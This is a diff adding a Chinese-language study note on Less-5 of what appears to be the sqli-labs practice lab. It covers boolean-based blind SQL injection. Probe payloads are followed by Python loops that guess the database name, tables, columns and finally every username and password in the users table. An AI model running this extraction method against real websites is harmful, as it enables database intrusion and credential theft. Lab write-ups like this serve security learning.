@@ -143,3 +143,83 @@ Your Password:3 → 说明第3列的数据显示在 Password 位置
 **结论**：闭合字符为 ")，注释符 --+。
 
 #### 后续流程类似Less-1
+
+
+
+
+## Less-5 (布尔盲注 - 单引号字符型)
+
+### 第一步：注入点判断
+> ?id=1 → 显示 "You are in..."  
+> ?id=1' → 报错  
+> ?id=1' --+ → 显示 "You are in..."  
+> ?id=1' and 1=1 --+ → 显示 "You are in..."  
+> ?id=1' and 1=2 --+ → 无显示  
+
+**结论**：单引号闭合，页面只有“有内容”和“无内容”两种状态，没有数据回显,使用布尔盲注。
+
+### 辅助函数定义
+- `test(condition)`：构造 `1' and [condition] #` 并发送请求，若页面包含 "You are in" 则返回 `True`，否则 `False`。
+- `get_data(sql_expr)`：利用 `test()` 自动获取任意 SQL 表达式的值（先探测长度，再逐字符猜解），返回字符串。
+
+### 第二步：获取数据库名
+先获取长度，再逐字符猜解
+
+```python
+# 长度探测：数据库名长度为 8
+for i in range(1, 31):
+    if test(f"length(database()) = {i}"):
+        db_len = i
+        break
+
+# 逐字符获取数据库名，遍历可打印 ASCII 码 32~126
+db_name = ""
+for pos in range(1, db_len+1):
+    for code in range(32, 127):
+        # 判断当前字符的 ASCII 码是否等于 code
+        if test(f"ascii(substr(database(),{pos},1)) = {code}"):
+            db_name += chr(code)
+            break
+print(f"Database: {db_name}")   # 输出 security
+```
+
+### 第三步：获取所有表名
+利用` information_schema.tables` 和 `limit`。
+```python
+# 统计表数量
+count = int(get_data("select count(*) from information_schema.tables where table_schema=database()"))
+print(f"[+] Found {count} tables")
+
+tables = []
+for i in range(count):
+    # 使用 limit i,1 依次获取第 i 个表名
+    tbl = get_data(f"select table_name from information_schema.tables where table_schema=database() limit {i},1")
+    tables.append(tbl)
+    print(f"  Table {i+1}: {tbl}")   # emails, referers, uagents, users
+```
+
+### 第四步：获取 users 表的列名
+```python
+# 统计列数
+col_count = int(get_data("select count(*) from information_schema.columns where table_schema=database() and table_name='users'"))
+print(f"[+] 'users' table has {col_count} columns")
+
+columns = []
+for i in range(col_count):
+    col = get_data(f"select column_name from information_schema.columns where table_schema=database() and table_name='users' limit {i},1")
+    columns.append(col)
+    print(f"  Column {i+1}: {col}")   # id, username, password
+```
+
+### 第五步：获取数据
+```python
+# 统计行数
+row_count = int(get_data("select count(*) from users"))
+print(f"[+] 'users' table has {row_count} rows")
+
+# 逐行提取用户名和密码
+for r in range(row_count):
+    username = get_data(f"select username from users limit {r},1")
+    password = get_data(f"select password from users limit {r},1")
+    print(f"  {username} : {password}")
+```
